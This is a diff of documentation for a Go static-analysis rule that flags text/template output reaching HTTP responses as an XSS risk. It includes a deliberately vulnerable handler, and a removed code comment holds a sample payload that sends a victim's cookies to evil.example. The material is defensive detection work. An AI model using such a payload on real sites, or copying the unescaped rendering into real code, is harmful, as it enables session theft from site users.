@@ -1,11 +1,11 @@
 ---
 title: "VNX-GO-009 – Go text/template Used for HTML"
-description: "Detect Go code that imports text/template for rendering HTML output, bypassing automatic HTML escaping and enabling cross-site scripting (XSS) attacks."
+description: "Detect Go code that renders a text/template template into an HTTP response, or loads .html files with text/template, so request data reaches the page unescaped (XSS)."
 ---
 
 ## Overview
 
-This rule flags Go files that import `text/template`. Go ships two template packages: `text/template` for generating arbitrary text output, and `html/template` for generating HTML. The critical difference is that `html/template` automatically escapes all values interpolated into the template based on their context (HTML body, attribute, URL, JavaScript, CSS), preventing cross-site scripting. `text/template` performs no escaping whatsoever — it inserts values verbatim. Using `text/template` to render HTML responses means any user-controlled content that reaches the template can inject arbitrary HTML and JavaScript into the page. This maps to [CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')](https://cwe.mitre.org/data/definitions/79.html).
+This rule flags Go code that renders a `text/template` template into an HTTP response or loads HTML files with it. Go ships two template packages: `text/template` for generating arbitrary text output, and `html/template` for generating HTML. The critical difference is that `html/template` automatically escapes all values interpolated into the template based on their context (HTML body, attribute, URL, JavaScript, CSS), preventing cross-site scripting. `text/template` performs no escaping whatsoever — it inserts values verbatim. Using `text/template` to render HTML responses means any user-controlled content that reaches the template can inject arbitrary HTML and JavaScript into the page. This maps to [CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')](https://cwe.mitre.org/data/definitions/79.html).
 
 **Severity:** High | **CWE:** [CWE-79 – Cross-site Scripting (XSS)](https://cwe.mitre.org/data/definitions/79.html)
 
@@ -15,28 +15,29 @@ XSS allows an attacker to execute arbitrary JavaScript in the context of a victi
 
 ## What Gets Flagged
 
-The rule fires on any `.go` file that imports `"text/template"`. The import alone indicates the package is in scope; the actual risk depends on whether template output is written to HTTP responses, but the safest approach is to switch to `html/template` for all web rendering.
+The rule reports the line where a `text/template` template produces HTML:
+
+- `Execute` / `ExecuteTemplate` on a template built with `text/template` in the same file (an aliased import such as `ttmpl "text/template"` is resolved, and `t.Lookup("row").Execute(...)` counts) whose writer is the HTTP response: a parameter declared `http.ResponseWriter`, `*fasthttp.RequestCtx` or `fiber.Ctx`, gin's `c.Writer`, echo's `c.Response()`, the `io.Writer` of an echo `Renderer`, or a `bufio`/`gzip` writer wrapped around one of these.
+- `ParseFiles`, `ParseGlob` or `ParseFS` with `text/template` on `.html`, `.htm`, `.gohtml` or `.xhtml` files, including `ParseFiles(files...)` over a slice literal of such names.
 
 ```go
-// FLAGGED: text/template does not escape HTML — dangerous for web output
 import (
     "net/http"
     "text/template"
 )
 
-var tmpl = template.Must(template.New("page").Parse(`
-    <html><body>
-    <h1>Hello, {{.Name}}!</h1>
-    </body></html>
-`))
+var greetPage = template.Must(template.New("greet").Parse(`<h1>Hello, {{.Name}}</h1>`))
 
-func helloHandler(w http.ResponseWriter, r *http.Request) {
-    name := r.FormValue("name")
-    // Attacker sends: name=<script>document.location='https://evil.example/?c='+document.cookie</script>
-    // The script tag is inserted verbatim into the HTML response
-    tmpl.Execute(w, map[string]string{"Name": name})
+func Greet(w http.ResponseWriter, r *http.Request) {
+    data := map[string]string{"Name": r.URL.Query().Get("name")}
+    greetPage.Execute(w, data) // FLAGGED: {{.Name}} is written verbatim
 }
+
+// FLAGGED: HTML files loaded with text/template are never escaped
+var Pages = template.Must(template.ParseGlob("web/templates/*.html"))
 ```
+
+Not reported: `html/template` (including a file that imports both packages and renders the page with `html/template`), `text/template` rendering Go source, YAML, shell, config or JSON into a file, buffer, stdout or outgoing request body, a handler that sets a `Content-Type` other than HTML or SVG (`text/plain`, `text/x-shellscript`, `application/json`) before rendering, and comments or strings that only name the package. A template defined in one file and executed in another is caught only through the `ParseFiles`/`ParseGlob` signal.
 
 ## Remediation
 
